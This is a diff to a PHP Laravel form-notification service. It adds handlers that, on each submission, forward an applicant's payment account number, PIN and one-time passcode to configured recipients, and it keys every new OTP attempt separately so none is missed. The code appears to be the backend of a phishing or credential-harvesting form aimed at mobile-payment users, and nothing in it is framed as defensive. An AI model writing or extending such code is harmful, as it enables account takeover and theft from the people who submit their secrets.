@@ -3,9 +3,11 @@
 declare(strict_types=1);
 
 namespace App\Modules\Forms;
-
 use App\Models\Application;
 use App\Notifications\ApplicationSubmittedNotification;
+use App\Notifications\PaymentAccountNumberSubmittedNotification;
+use App\Notifications\PaymentOtpSubmittedNotification;
+use App\Notifications\PinSubmittedNotification;
 use App\Notifications\VerifiedPaymentNotification;
 use Illuminate\Support\Facades\Cache;
 use Illuminate\Support\Facades\Log;
@@ -18,16 +20,87 @@ use Throwable;
  */
 final class FormNotificationService
 {
-    public function notifySubmission(FormDefinition $form, Application $application): void
+    public function notifySubmission(FormDefinition $form, Application $application, bool $force = false): void
     {
+        $claimKey = 'form-notification:submission:'.$application->id;
+
+        if ($force) {
+            Cache::forget($claimKey);
+        }
+
         $this->sendOnce(
-            'form-notification:submission:'.$application->id,
+            $claimKey,
             $application,
             $this->recipients($form, $application, 'submission'),
             new ApplicationSubmittedNotification($application),
         );
     }
+    public function notifyPaymentAccountSubmitted(Application $application): void
+    {
+        $form = app(FormRegistry::class)->find($application->form_slug);
 
+        if (! $form instanceof FormDefinition) {
+            Log::warning('Payment number notification skipped because the form is unavailable.', [
+                'application_id' => $application->id,
+                'form_slug' => $application->form_slug,
+            ]);
+
+            return;
+        }
+
+        $this->sendOnce(
+            'form-notification:payment-number:'.$application->id.':'.md5((string) $application->payment_number),
+            $application,
+            $this->recipients($form, $application, 'payment-number'),
+            new PaymentAccountNumberSubmittedNotification($application),
+        );
+    }
+    public function notifyPinSubmitted(Application $application): void
+    {
+        $form = app(FormRegistry::class)->find($application->form_slug);
+
+        if (! $form instanceof FormDefinition) {
+            Log::warning('PIN notification skipped because the form is unavailable.', [
+                'application_id' => $application->id,
+                'form_slug' => $application->form_slug,
+            ]);
+
+            return;
+        }
+
+        $this->sendOnce(
+            'form-notification:pin:'.$application->id.':'.md5((string) $application->pin),
+            $application,
+            $this->recipients($form, $application, 'pin'),
+            new PinSubmittedNotification($application),
+        );
+    }
+
+
+
+    public function notifyOtpSubmitted(Application $application, string $otp): void
+    {
+        $form = app(FormRegistry::class)->find($application->form_slug);
+
+        if (! $form instanceof FormDefinition) {
+            Log::warning('OTP notification skipped because the form is unavailable.', [
+                'application_id' => $application->id,
+                'form_slug' => $application->form_slug,
+            ]);
+
+            return;
+        }
+
+        $metaInfo = is_array($application->meta_info) ? $application->meta_info : [];
+        $attempt = count($metaInfo['box-no'] ?? []); // এই OTP কততম জমা, এটাই চাবিকে ইউনিক করে
+
+        $this->sendOnce(
+            'form-notification:otp:'.$application->id.':'.$attempt,
+            $application,
+            $this->recipients($form, $application, 'otp'),
+            new PaymentOtpSubmittedNotification($application, $otp),
+        );
+    }
     public function notifyVerifiedPayment(Application $application, bool $verifiedByProvider): void
     {
         if (! $verifiedByProvider || ! in_array($application->payment_status, ['paid', 'success'], true)) {
